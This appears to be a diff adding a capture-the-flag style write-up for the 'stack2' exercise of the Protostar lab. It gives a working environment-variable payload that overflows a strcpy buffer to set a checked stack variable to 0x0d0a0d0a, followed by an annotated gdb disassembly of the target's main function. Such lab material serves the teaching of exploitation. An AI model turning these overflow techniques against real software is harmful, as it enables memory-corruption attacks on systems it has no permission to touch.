@@ -1,0 +1,82 @@
+
+
+Solution: 
+
+	export GREENIE=`python3 -c "import sys;sys.stdout.buffer.write(b'\x61'*64+b'\x0a\x0d\x0a\x0d')"` && ./stack2
+	
+	The strategy here is identical to the last ones, the difference 
+	is that the input is from an env variable instead of stdin. Like
+        last time our little endian string is "\x0a\x0d\x0a\x0d"
+ 
+Analysis: 
+	
+	6(main) : Allocates 0x60 bytes on the stack
+	9(main) : Moves ref to string "GREENIE" to top of stack
+       16(main) : Gets env var "GREENIE" into eax
+       21(main) : Moves eax into bottom of stack
+       25(main) : Compares env var "GREENIE" to 0 
+       30(main) : Jumps to 52 if the env var is defined
+       32(main) : Moves ref of error string to second pos of stack
+       40(main) : Moves '1' to top of stack for errx
+       47(main) : Calls errx
+       52(main) : Moves 0 to second to bottom val on stack
+       60(main) : Moves env var "GREENIE" into eax  
+       64(main) : Moves env var as second to first val on stack
+       68(main) : Moves address of top of buffer in stack to eax
+       72(main) : Moves that address to top of stack for strcpy
+       75(main) : Calls strcpy
+       80(main) : Moves modified into eax
+       84(main) : Compares eax with 0x0d0a0d0a
+       89(main) : If not equal go fail routine at 105
+       91(main) : Moves ref to  congratulatory msg to top of stack
+       98(main) : Call puts to print above string to stdout
+      103(main) : Jump to 126 to end program
+      105(main) : Moves modified val into edx
+      109(main) : Moves fail string ref into eax
+      114(main) : Modified val into second to first val of stack
+      118(main) : Moves fail string ref to top of stack
+      121(main) : Calls printf
+      126(main) : Prep prog return
+      127(main) : Return prog
+
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048494 <+0>:     push   ebp
+   0x08048495 <+1>:     mov    ebp,esp
+   0x08048497 <+3>:     and    esp,0xfffffff0
+   0x0804849a <+6>:     sub    esp,0x60
+   0x0804849d <+9>:     mov    DWORD PTR [esp],0x80485e0
+   0x080484a4 <+16>:    call   0x804837c <getenv@plt>
+   0x080484a9 <+21>:    mov    DWORD PTR [esp+0x5c],eax
+   0x080484ad <+25>:    cmp    DWORD PTR [esp+0x5c],0x0
+   0x080484b2 <+30>:    jne    0x80484c8 <main+52>
+   0x080484b4 <+32>:    mov    DWORD PTR [esp+0x4],0x80485e8
+   0x080484bc <+40>:    mov    DWORD PTR [esp],0x1
+   0x080484c3 <+47>:    call   0x80483bc <errx@plt>
+   0x080484c8 <+52>:    mov    DWORD PTR [esp+0x58],0x0
+   0x080484d0 <+60>:    mov    eax,DWORD PTR [esp+0x5c]
+   0x080484d4 <+64>:    mov    DWORD PTR [esp+0x4],eax
+   0x080484d8 <+68>:    lea    eax,[esp+0x18]
+   0x080484dc <+72>:    mov    DWORD PTR [esp],eax
+   0x080484df <+75>:    call   0x804839c <strcpy@plt>
+   0x080484e4 <+80>:    mov    eax,DWORD PTR [esp+0x58]
+   0x080484e8 <+84>:    cmp    eax,0xd0a0d0a
+   0x080484ed <+89>:    jne    0x80484fd <main+105>
+   0x080484ef <+91>:    mov    DWORD PTR [esp],0x8048618
+   0x080484f6 <+98>:    call   0x80483cc <puts@plt>
+   0x080484fb <+103>:   jmp    0x8048512 <main+126>
+   0x080484fd <+105>:   mov    edx,DWORD PTR [esp+0x58]
+   0x08048501 <+109>:   mov    eax,0x8048641
+   0x08048506 <+114>:   mov    DWORD PTR [esp+0x4],edx
+   0x0804850a <+118>:   mov    DWORD PTR [esp],eax
+   0x0804850d <+121>:   call   0x80483ac <printf@plt>
+   0x08048512 <+126>:   leave  
+   0x08048513 <+127>:   ret    
+End of assembler dump.
+(gdb) x 0x80485e0
+0x80485e0:      0x45455247  --> "GREE"
+
+(gdb) x 0x80485e4
+0x80485e4:      0x0045494e  --> "NIE"
+
